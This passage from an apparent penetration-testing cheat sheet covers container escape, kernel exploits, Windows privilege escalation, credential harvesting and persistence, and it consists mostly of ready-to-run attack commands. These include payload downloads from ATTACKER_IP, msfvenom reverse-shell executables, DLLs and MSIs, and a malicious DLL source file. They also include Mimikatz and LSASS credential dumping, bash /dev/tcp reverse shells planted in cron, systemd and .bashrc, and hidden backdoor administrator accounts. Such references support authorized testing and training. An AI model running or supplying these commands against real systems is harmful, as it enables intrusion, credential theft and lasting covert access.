mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "chmod +s /bin/bash" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
/bin/bash -p
```

---

### 3.10 Kernel Exploits
**Concept:** Exploit kernel vulnerabilities for privilege escalation. **WARNING:** Can crash systems - use as last resort.

**Gather kernel information:**
```bash
uname -a
uname -r
cat /proc/version
cat /etc/issue
cat /etc/os-release
arch
```

**Automated exploit suggestion:**
```bash
# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# Search exploits
searchsploit linux kernel $(uname -r)
```

**Notable kernel exploits:**
- **CVE-2022-0847** (Dirty Pipe) - Linux 5.8+ - Overwrite read-only files
- **CVE-2021-4034** (PwnKit) - polkit < 0.120 - Local privilege escalation
- **CVE-2021-3493** - Ubuntu kernels - OverlayFS vulnerability
- **CVE-2017-16995** - Linux < 4.14.11 - BPF privilege escalation
- **CVE-2016-5195** (Dirty COW) - Linux 2.6.22-4.8.3 - Race condition
- **CVE-2015-1328** - Ubuntu 12.04/14.04/14.10/15.04 - OverlayFS

---

## 4 Windows Automated Enumeration

### 4.1 WinPEAS (Windows Privilege Escalation Awesome Script)

**üöÄ Download & Execute**

```powershell
# Download and execute
certutil -urlcache -f http://ATTACKER_IP/winPEASx64.exe winpeas.exe
.\winpeas.exe

# Quiet mode (less output)
.\winpeas.exe quiet

# Save output to file
.\winpeas.exe > winpeas_output.txt

# Specific checks
.\winpeas.exe systeminfo
.\winpeas.exe userinfo
.\winpeas.exe processinfo
.\winpeas.exe servicesinfo
.\winpeas.exe applicationsinfo

# All checks with output
.\winpeas.exe cmd > winpeas_full.txt
```

**Alternative download methods:**

```cmd
# PowerShell
powershell -c "IEX(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/winPEAS.exe','winpeas.exe')"

# BITSAdmin
bitsadmin /transfer myDownloadJob /download /priority normal http://ATTACKER_IP/winpeas.exe C:\Temp\winpeas.exe
```

### 4.2 PowerUp

**üöÄ Download & Execute**

```powershell
# Download and import
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')

# Run all checks
Invoke-AllChecks

# Specific checks
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceDetail
Find-PathDLLHijack
Get-ModifiableRegistryAutoRun
Get-ModifiableScheduledTaskFile
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-RegAlwaysInstallElevated

# Abuse functions
Write-ServiceBinary -Name 'VulnService' -Path 'C:\Program Files\Service\service.exe'
Install-ServiceBinary -Name 'VulnService'
Restore-ServiceBinary -Name 'VulnService'
```

### 4.3 Seatbelt

**üöÄ Download & Execute**

```cmd
# Download
certutil -urlcache -f http://ATTACKER_IP/Seatbelt.exe Seatbelt.exe

# Run all checks
Seatbelt.exe -group=all

# Specific groups
Seatbelt.exe -group=system
Seatbelt.exe -group=user
Seatbelt.exe -group=misc
Seatbelt.exe -group=remote

# Save output
Seatbelt.exe -group=all -outputfile=C:\Temp\seatbelt.txt

# Specific checks
Seatbelt.exe TokenPrivileges
Seatbelt.exe WindowsCredentialFiles
Seatbelt.exe AMSIProviders
Seatbelt.exe ARPTable
```

### 4.4 Analyzing Automated Results

**Priority Findings:**

1. **CRITICAL** - Immediate privilege escalation
    
    - SeImpersonatePrivilege/SeAssignPrimaryToken enabled
    - AlwaysInstallElevated enabled
    - Unquoted service paths with writable directories
    - Writable service binaries
    - Stored credentials (Autologon, WiFi passwords)
2. **HIGH** - Likely privilege escalation
    
    - Weak service permissions
    - Modifiable scheduled tasks
    - DLL hijacking opportunities
    - Interesting registry keys
3. **MEDIUM** - Requires investigation
    
    - Kernel exploit suggestions
    - Interesting file permissions
    - Potential password locations

---

## 5 Windows Manual Privilege Escalation

|Technique|Idea|Check (example)|
|---|---|---|
|Token privileges|Abusable privileges like SeImpersonate|`whoami /priv`|
|Service exploitation|Misconfigured service perms/paths|`wmic service get name,pathname,startmode`|
|Scheduled tasks|Writable task scripts or binaries|`schtasks /query /fo LIST /v`|
|AlwaysInstallElevated|MSI installs as SYSTEM if both keys set|`reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated`|
|Registry autoruns|Writable Run keys for code execution|`reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`|
|File/dir permissions|Writable program/service directories|`icacls "C:\\Program Files"`|
|DLL hijacking|App loads DLL from writable path|`wmic process get name,executablepath`|

### 5.1 Windows Token Privileges
**Concept:** Windows token privileges grant specific capabilities beyond standard user permissions. Certain privileges allow privilege escalation when exploited.

**üîç Enumerate Privileges**

```cmd
whoami /priv
whoami /groups
whoami /all
```

**üéØ Exploitable Privileges**

|Privilege|Tool|Exploitation|Priority|
|---|---|---|---|
|**SeImpersonatePrivilege**|PrintSpoofer, GodPotato|Token impersonation|CRITICAL|
|**SeAssignPrimaryTokenPrivilege**|JuicyPotato|Assign primary token|CRITICAL|
|**SeBackupPrivilege**|Robocopy, Diskshadow|Backup any file|HIGH|
|**SeRestorePrivilege**|-|Restore any file|HIGH|
|**SeTakeOwnershipPrivilege**|takeown, icacls|Take ownership|HIGH|
|**SeDebugPrivilege**|Procdump|Debug/inject processes|HIGH|
|**SeLoadDriverPrivilege**|-|Load kernel drivers|HIGH|
|**SeManageVolumePrivilege**|-|Manage disk volumes|MEDIUM|

**üí• SeImpersonatePrivilege Exploitation**

```cmd
# Check Windows version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Windows 10 / Server 2016-2022: PrintSpoofer
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c powershell

# Windows Server 2019+: GodPotato
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net localgroup administrators <USER> /add"

# Older Windows: JuicyPotato
# Find CLSID for your Windows version from https://github.com/ohpe/juicy-potato/tree/master/CLSID
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {CLSID}

# RoguePotato
RoguePotato.exe -r ATTACKER_IP -l 9999 -e "cmd.exe"
```

**üí• SeBackupPrivilege Exploitation**

```cmd
# Backup SAM and SYSTEM hives
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive

# Use diskshadow to backup files
# Create script
echo set context persistent nowriters > diskshadow.txt
echo add volume c: alias someAlias >> diskshadow.txt
echo create >> diskshadow.txt
echo expose %someAlias% z: >> diskshadow.txt
diskshadow /s diskshadow.txt

# Copy files
robocopy /b z:\Windows\NTDS . ntds.dit
```

**üí• SeTakeOwnershipPrivilege Exploitation**

```cmd
# Take ownership of a file
takeown /f C:\Windows\System32\config\SAM
icacls C:\Windows\System32\config\SAM /grant %username%:F

# Take ownership recursively
takeown /f C:\Windows\System32\config /r /d y
```

**üí• SeDebugPrivilege Exploitation**

```cmd
# Dump LSASS memory
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Inject into process
# Use tools like: Invoke-ReflectivePEInjection
```

---

### 5.2 Service Exploitation
**Concept:** Windows services running with elevated privileges can be exploited through misconfigurations in permissions, paths, or binaries.

**üîç Service Enumeration**

```cmd
# List all services
sc query
sc query state=all
wmic service get name,displayname,pathname,startmode

# Detailed service info
sc qc <SERVICE_NAME>
sc query <SERVICE_NAME>

# Services running as SYSTEM
wmic service where "startname='LocalSystem'" get name,pathname

# Services not in System32
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Check service permissions
sc sdshow <SERVICE_NAME>
accesschk.exe /accepteula -uwcv <SERVICE_NAME>
accesschk.exe /accepteula -ucqv <SERVICE_NAME>

# Check executable permissions
icacls "C:\Program Files\Service\service.exe"
accesschk.exe /accepteula -quvw "C:\Program Files\Service\service.exe"
```

**üéØ Unquoted Service Paths**

```cmd
# Find unquoted service paths
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerShell method
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike '*"*' -and $_.PathName -like '* *'} | Select Name, PathName

# If path is: C:\Program Files\Vulnerable Service\service.exe
# Windows searches in order:
# C:\Program.exe
# C:\Program Files\Vulnerable.exe
# C:\Program Files\Vulnerable Service\service.exe

# Check writable directories
icacls "C:\Program Files"
accesschk.exe /accepteula -uwdq "C:\Program Files\"

# Place malicious executable
copy C:\Temp\malicious.exe "C:\Program.exe"

# Restart service
sc stop <SERVICE_NAME>
sc start <SERVICE_NAME>

# Or wait for reboot
shutdown /r /t 0
```

**üéØ Weak Service Permissions**

```cmd
# Check service permissions with accesschk
accesschk.exe /accepteula -uwcv * | findstr /i "SERVICE_ALL_ACCESS\|SERVICE_CHANGE_CONFIG"

# If you have SERVICE_CHANGE_CONFIG:
sc config <SERVICE_NAME> binPath= "cmd /c net localgroup administrators <USER> /add"
sc stop <SERVICE_NAME>
sc start <SERVICE_NAME>

# Alternative payload
sc config <SERVICE_NAME> binPath= "C:\Temp\reverse_shell.exe"

# Check if you can start/stop
sc start <SERVICE_NAME>
sc stop <SERVICE_NAME>
```

**üéØ Modifiable Service Binary**

```cmd
# Check binary permissions
icacls "C:\Program Files\Service\service.exe"
accesschk.exe /accepteula -quvw "C:\Program Files\Service\service.exe"

# If writable, replace with malicious binary
# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o service.exe

# Backup original
move "C:\Program Files\Service\service.exe" "C:\Program Files\Service\service.exe.bak"

# Replace with malicious
copy C:\Temp\service.exe "C:\Program Files\Service\service.exe"

# Restart service
sc stop ServiceName
sc start ServiceName
```

---

### 5.3 Scheduled Tasks
**Concept:** Scheduled tasks running with elevated privileges can be exploited if their scripts or executables are writable.

**üîç Scheduled Task Enumeration**

```cmd
# List all scheduled tasks
schtasks /query /fo LIST /v
schtasks /query /fo TABLE /nh

# Detailed XML output
schtasks /query /tn "TaskName" /xml
schtasks /query /fo LIST /v > tasks.txt

# PowerShell enumeration
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Format-Table TaskName,TaskPath,State
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"} | Format-Table TaskName,Actions

# Check permissions on task files
icacls C:\Windows\System32\Tasks
dir C:\Windows\System32\Tasks /s

# Check task directories
dir C:\Windows\Tasks
```

**üéØ Writable Scheduled Task Scripts**

```cmd
# Find scripts/executables run by tasks
schtasks /query /fo LIST /v | findstr /i "exe\|bat\|ps1\|cmd"

# Check permissions on scripts
icacls "C:\Path\To\Script.bat"
accesschk.exe /accepteula -quvw "C:\Path\To\Script.bat"

# If writable, modify script
echo net localgroup administrators <USER> /add >> C:\Path\To\Script.bat

# Or replace completely
echo cmd /c C:\Temp\reverse_shell.exe > C:\Path\To\Script.bat

# Wait for task execution or force run
schtasks /run /tn "TaskName"
```

---

### 5.4 AlwaysInstallElevated
**Concept:** Windows policy allowing MSI packages to install with elevated privileges. If both HKLM and HKCU registry keys are set, any user can install MSI with SYSTEM privileges.

**üîç Check Registry Settings**

```cmd
# Both registry keys must be set to 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# PowerShell check
Get-ItemProperty HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

**üí• Exploitation**

```bash
# On attacker: Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o shell.msi

# Alternative: add user to administrators
msfvenom -p windows/adduser USER=hacker PASS=Password123! -f msi -o adduser.msi
```

```cmd
# On target: Install MSI
msiexec /quiet /qn /i C:\Temp\shell.msi

# Alternative installation methods
msiexec /i C:\Temp\shell.msi /quiet
msiexec /q /i C:\Temp\shell.msi
```

---

### 5.5 Registry Exploitation
**Concept:** Windows Registry autorun locations can be exploited if they have weak permissions or point to modifiable executables.

**üîç Registry Enumeration**

```cmd
# Autorun locations
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# Startup folders
dir "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

# Check permissions on autorun entries
accesschk.exe /accepteula -wvu "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# PowerShell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

**üí• Writable Autorun Registry Keys**

```cmd
# If you have write access to Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Temp\shell.exe"

# Or modify existing entry
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdateService /t REG_SZ /d "C:\Temp\shell.exe" /f
```

---

### 5.6 File and Directory Permissions
**Concept:** Writable directories in privileged application paths can be exploited by replacing legitimate binaries with malicious ones.

**üîç Permission Enumeration**

```cmd
# Check writable directories
accesschk.exe /accepteula -uwdqs Users "C:\Program Files\"
accesschk.exe /accepteula -uwdqs "Authenticated Users" "C:\Program Files\"

# Check specific directory
icacls "C:\Program Files\Application"
accesschk.exe /accepteula -uwdq "C:\Program Files\Application"

# Check system directories
icacls "C:\Windows\System32"
icacls "C:\Windows\Temp"

# Find world-writable files
accesschk.exe /accepteula -uwqs Everyone "C:\Program Files\*"
```

**üí• Exploitable File Permissions**

```cmd
# If application directory is writable
# Replace legitimate DLL or EXE with malicious version

# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o malicious.exe

# Backup original
move "C:\Program Files\App\app.exe" "C:\Program Files\App\app.exe.bak"

# Replace
copy C:\Temp\malicious.exe "C:\Program Files\App\app.exe"

# Wait for execution or restart service
```

---

### 5.7 DLL Hijacking
**Concept:** Applications loading DLLs from insecure locations can be exploited by placing malicious DLLs in the DLL search order path.

**üîç Finding DLL Hijacking Opportunities**

```cmd
# Use Process Monitor (procmon.exe)
# Filter for "NAME NOT FOUND" and ".dll"

# Check DLL search order
# 1. Directory of the application
# 2. System directory (C:\Windows\System32)
# 3. 16-bit system directory
# 4. Windows directory (C:\Windows)
# 5. Current directory
# 6. Directories in PATH
```

**üí• DLL Hijacking Exploitation**

```c
// malicious.dll source code
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        system("cmd.exe /c net localgroup administrators <USER> /add");
        break;
    }
    return TRUE;
}
```

```bash
# Compile on Kali
x86_64-w64-mingw32-gcc -shared -o malicious.dll malicious.c

# Or use msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o malicious.dll
```

```cmd
# Place DLL in writable location in search order
copy C:\Temp\malicious.dll "C:\Program Files\Application\missing.dll"

# Restart application or wait for execution
```
---

# 6 Credential Harvesting

## 6.1 History Files

Command history often contains passwords typed as arguments (e.g., `mysql -pPassword`).

### üêß Linux History Files

```bash
# Standard Shells
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
cat ~/.zsh_history 2>/dev/null
cat ~/.fish_history 2>/dev/null

# App-Specific History
cat ~/.mysql_history 2>/dev/null
cat ~/.psql_history 2>/dev/null
cat ~/.dbshell 2>/dev/null
cat ~/.viminfo 2>/dev/null
cat ~/.lesshst 2>/dev/null

# Search history for secrets
grep -rE "password|passwd|ssh|user|token|api" /home/*/.*_history 2>/dev/null
```

### ü™ü Windows History Files

```powershell
# PowerShell History (v5+)
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# All Users
dir C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# CMD History (Memory Only - press F7 in session)
doskey /history
```

---

## 6.2 File System & Configuration Hunting

### üêß Linux File Hunting

```bash
# Search file CONTENTS for "password" (slow on /)
grep -rnw '/var/www' -e "password" 2>/dev/null | grep -v Binary
grep -rE "password|pass|DB_PASS|api_key|secret" /var/www/ 2>/dev/null

# Find Configuration Files
find / -name "*.conf" -o -name "*.config" -o -name "*.cnf" 2>/dev/null
find /var/www -name "wp-config.php" -o -name "config.php" -o -name ".env" 2>/dev/null
find /opt -name "*.ini" -o -name "*.yaml" -o -name "*.yml" 2>/dev/null

# Find "Interesting" Files
find / -name "*.kdbx" 2>/dev/null              # KeePass
find / -name "*.ovpn" 2>/dev/null              # OpenVPN
find / -name "*.pem" -o -name "*.key" 2>/dev/null  # Private Keys
find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null
find / -name "*backup*" -name "*.sql" 2>/dev/null  # SQL Backups

# Find files that commonly contain passwords for privilege escalation (only searches readable files)
find / -type f -readable \( -name "*.conf" -o -name "*.config" -o -name "*.xml" -o -name "*.ini" -o -name "*.env" -o -name "*.txt" -o -name "*.log" -o -name "*.bak" -o -name "*password*" -o -name "*credentials*" -o -name ".bash_history" -o -name ".mysql_history" -o -name "id_rsa" -o -name "id_dsa" -o -name "authorized_keys" \) 2>/dev/null -exec grep -H -i -E "(password|passwd|pwd|pass|credential|api_key|secret|token)\s*[:=]" {} \; 2>/dev/null

```

### ü™ü Windows File Hunting

```cmd
# Search file CONTENTS for "password"
findstr /si "password" *.txt *.xml *.ini *.config *.php
findstr /si "connectionString" C:\*.config

# Unattended Install Files (High Value - often contains admin passwords)
dir /s /b C:\Windows\Panther\Unattend.xml
dir /s /b C:\Windows\Panther\Unattended.xml
dir /s /b C:\sysprep.inf
dir /s /b C:\Windows\System32\sysprep\*.xml

# Find "Interesting" Extensions
dir /s /b *.kdbx                # KeePass Database
dir /s /b *.rdp                 # Saved RDP connections
dir /s /b *.vnc                 # VNC configs
dir /s /b *.ovpn                # OpenVPN
dir /s /b *pass*                # Files with "pass" in name
dir /s /b *secret*              # Files with "secret" in name
dir /s /b *.ppk                 # PuTTY Private Keys

# IIS Web Configs
type C:\inetpub\wwwroot\web.config
findstr /si "connectionString" C:\inetpub\wwwroot\*.config
```

---

## 6.3 Database Credentials

### üêß Linux Database Files

```bash
# MySQL / MariaDB
cat /etc/mysql/my.cnf
cat ~/.my.cnf 2>/dev/null
grep -r "password" /etc/mysql/

# PostgreSQL
cat /var/lib/postgresql/.pgpass
cat ~/.pgpass

# MongoDB
cat /etc/mongod.conf
grep "password" /etc/mongod.conf

# Redis
cat /etc/redis/redis.conf
grep "requirepass" /etc/redis/redis.conf

# SQLite (Flat file databases)
find / -name "*.sqlite" -o -name "*.db" 2>/dev/null
```

### ü™ü Windows Database Files

```cmd
# MSSQL (Check registry)
reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server" /s
reg query "HKLM\SOFTWARE\Microsoft\MSSQLServer" /s

# Access / Excel DBs
dir /s /b *.mdb
dir /s /b *.accdb
dir /s /b *.xlsx
```

---

## 6.4 SSH Keys

SSH keys enable lateral movement without passwords.

### üîç Finding Keys

```bash
# Find Private Keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find /home -name "*.pem" 2>/dev/null
find /root -name "authorized_keys" 2>/dev/null

# Check Authorized Keys (who can log in here?)
cat ~/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
cat /home/*/.ssh/authorized_keys 2>/dev/null

# Check SSH Config (may reveal hosts/users)
cat ~/.ssh/config
cat /etc/ssh/ssh_config
```

### üí• Using Keys

```bash
# 1. Copy key to attacker machine
# 2. Set permissions (Critical - SSH will refuse loose permissions)
chmod 600 id_rsa

# 3. Connect
ssh -i id_rsa user@target

# 4. If passphrase protected, crack with John
ssh2john id_rsa > hash.txt
john --wordlist=rockyou.txt hash.txt
```

---

## 6.5 Browser Credentials

Browsers store logins in encrypted SQLite databases. Tools required to decrypt.

### ü™ü Windows Locations

```cmd
# Chrome/Edge/Brave
dir "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
dir "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"
dir "%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data"

# Firefox
dir "%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\logins.json"
dir "%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\key4.db"
```

### üêß Linux Locations

```bash
# Chrome/Chromium
~/.config/google-chrome/Default/Login Data
~/.config/chromium/Default/Login Data

# Firefox
~/.mozilla/firefox/*.default-release/logins.json
~/.mozilla/firefox/*.default-release/key4.db
```

### üîì Extraction Tools

```bash
# LaZagne (Windows/Linux)
lazagne.exe browsers
python3 lazagne.py browsers

# SharpChrome (Windows - Chrome only)
SharpChrome.exe logins

# Firefox Decrypt (Linux/Windows)
python firefox_decrypt.py
```

---

## 6.6 Credential Dumping (Mimikatz & More)

‚ö†Ô∏è **Warning:** LSASS dumping is noisy and flagged by AV/EDR.

### ü•ù Mimikatz (Windows)

Requires Administrator/SYSTEM privileges.

```cmd
# Start Mimikatz
mimikatz.exe

# Enable Debug Privilege
privilege::debug

# Dump Logon Passwords (cleartext if WDigest enabled)
sekurlsa::logonpasswords

# Dump SAM Database (Local Account Hashes)
lsadump::sam

# Dump LSA Secrets (Service accounts, auto-logon passwords)
lsadump::secrets

# Dump Credential Manager
vault::cred

# DCSync (Domain Controller - Dumps all domain hashes)
lsadump::dcsync /domain:lab.local /all /csv

# Kerberos Tickets
sekurlsa::tickets /export

# Pass-the-Hash
sekurlsa::pth /user:Administrator /domain:lab.local /ntlm:hash /run:cmd.exe
```

### üîì Manual Registry Dumping (Stealthier)

Dump hives and crack offline to avoid AV detection.

```cmd
# Save Registry Hives (Requires SYSTEM/Admin)
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive

# Transfer to attacker machine, then extract
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

### üêß Linux Dumping

```bash
# Mimipenguin (Dump cleartext passwords from memory)
./mimipenguin.sh

# LaZagne (Multi-application credential recovery)
python3 lazagne.py all

# LinPEAS (Automated credential search)
./linpeas.sh

# /etc/shadow (Requires root)
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

---

## 6.7 WiFi & Network Credentials

### ü™ü Windows WiFi

```cmd
# List saved WiFi profiles
netsh wlan show profiles

# Show password for specific profile (Cleartext)
netsh wlan show profile name="MyWiFi" key=clear

# Export all profiles
netsh wlan export profile key=clear folder=C:\temp
```

### üêß Linux WiFi

```bash
# Network Manager Connections (Requires root)
cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep psk=

# WPA Supplicant
cat /etc/wpa_supplicant/wpa_supplicant.conf
grep -i "psk=" /etc/wpa_supplicant/wpa_supplicant.conf
```

---

## 6.8 Additional Sources

### Windows Credential Manager

```cmd
# List stored credentials
cmdkey /list

# Dump using PowerShell
powershell -c "Get-StoredCredential"

# Export credentials
rundll32.exe keymgr.dll,KRShowKeyMgr
```

### Cloud Credentials

```bash
# AWS
cat ~/.aws/credentials
cat ~/.aws/config

# Azure
cat ~/.azure/credentials

# GCP
cat ~/.config/gcloud/credentials.db
cat ~/.config/gcloud/application_default_credentials.json

# DigitalOcean
cat ~/.config/doctl/config.yaml
```

### Application Configs

```bash
# Git (may contain credentials in remote URLs)
cat ~/.gitconfig
cat .git/config

# Docker
cat ~/.docker/config.json

# Kubernetes
cat ~/.kube/config

# Ansible
find / -name "ansible.cfg" 2>/dev/null
find / -name "*.vault" 2>/dev/null
```

---

## 7 Persistence Mechanisms

** Ô∏è Note:** Only establish persistence if explicitly authorized in the scope.

### 7.1 Linux Persistence

**üîë SSH Key Persistence**

```bash
# Generate key pair on attacker
ssh-keygen -f persist_key

# Add public key to target
echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@kali" >> /root/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@kali" >> /home/user/.ssh/authorized_keys

# Ensure proper permissions
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# Set immutable flag (prevents deletion)
chattr +i /root/.ssh/authorized_keys
# To remove: chattr -i /root/.ssh/authorized_keys
```

**‚è∞ Cron Job Persistence**

```bash
# Add reverse shell to crontab
(crontab -l; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -

# System-wide cron
echo "*/5 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /etc/crontab

# Cron script
cat > /etc/cron.daily/update << EOF
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /etc/cron.daily/update
```

**üîß Service Persistence**

```bash
# Create systemd service
cat > /etc/systemd/system/persist.service << EOF
[Unit]
Description=Persistence Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable persist.service
systemctl start persist.service
```

**üêö Shell Persistence**

```bash
# Add to .bashrc
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &" >> /root/.bashrc

# SUID shell
cp /bin/bash /tmp/.hidden
chmod +s /tmp/.hidden
# Use with: /tmp/.hidden -p
```

**üìù /etc/passwd Backdoor**

```bash
# Create backdoor user
openssl passwd -1 -salt salt password123
echo 'backdoor:$1$salt$qVR7HRO59TLcCKGLXyXQZ.:0:0:root:/root:/bin/bash' >> /etc/passwd
```

### 7.2 Windows Persistence

**üìÖ Scheduled Task Persistence**

```cmd
# Create scheduled task
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\System32\reverse_shell.exe" /sc onlogon /ru System
schtasks /create /tn "Update" /tr "powershell -enc <BASE64>" /sc minute /mo 5

# Alternative with XML
schtasks /create /tn "Updater" /xml task.xml
```

**üîë Registry Run Key Persistence**

```cmd
# Current user
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Temp\shell.exe" /f

# Local machine (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Temp\shell.exe" /f

# RunOnce
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Update" /t REG_SZ /d "C:\Temp\shell.exe" /f
```

**‚öôÔ∏è Service Persistence**

```cmd
# Create new service
sc create "WindowsUpdate" binPath= "C:\Windows\System32\reverse_shell.exe" start= auto
sc start "WindowsUpdate"

# Modify existing service
sc config <SERVICE_NAME> binPath= "C:\Temp\shell.exe" start= auto
```

**ü™ü Startup Folder Persistence**

```cmd
# Current user
copy C:\Temp\shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# All users (requires admin)
copy C:\Temp\shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
```

**üë§ User Account Persistence**

```cmd
# Create backdoor user
net user backdoor Password123! /add
net localgroup Administrators backdoor /add

# Hide user (won't show on login screen)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v backdoor /t REG_DWORD /d 0 /f
```

**üîê RDP Persistence**

```cmd
# Enable RDP
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Allow through firewall
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Create RDP user
net user rdpuser Password123! /add
net localgroup "Remote Desktop Users" rdpuser /add
```

---

## üìö Additional Resources

**Essential References:**

- [GTFOBins](https://gtfobins.github.io/) - Unix binaries exploitation
- [LOLBAS](https://lolbas-project.github.io/) - Windows binaries
- [HackTricks](https://book.hacktricks.xyz/) - Comprehensive pentesting guide
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Exploitation payloads
- [PEASS-ng](https://github.com/carlospolop/PEASS-ng) - Privilege escalation scripts
- [Windows Privilege Escalation Guide](https://www.fuzzysecurity.com/tutorials/16.html)
